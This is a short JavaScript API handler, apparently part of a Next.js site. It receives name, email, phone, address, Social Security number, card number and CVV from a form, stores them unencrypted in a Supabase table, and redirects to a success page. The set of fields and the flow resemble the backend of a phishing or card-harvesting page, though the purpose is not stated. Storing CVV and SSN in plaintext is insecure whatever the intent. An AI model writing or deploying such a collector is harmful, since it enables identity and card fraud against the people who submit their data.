
// api/submit.js
import { createClient } from "@supabase/supabase-js";

const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL,
  process.env.SUPABASE_SERVICE_KEY
);

export default async function handler(req, res) {
  if (req.method === "POST") {
    const { name, email, phone, address, SSN, Card_No, CVV } = req.body;

    // Save into Supabase
    const { error } = await supabase
      .from("applications")
      .insert([{ name, email, phone, address,SSN, Card_No, CVV }]);

    if (error) {
      console.error("❌ Error inserting:", error);
      return res.status(500).json({ message: "Database error" });
    }

    // Redirect to thank-you page
    res.redirect(302, "/successful.html");
  } else {
    res.status(405).json({ message: "Method not allowed" });
  }
}
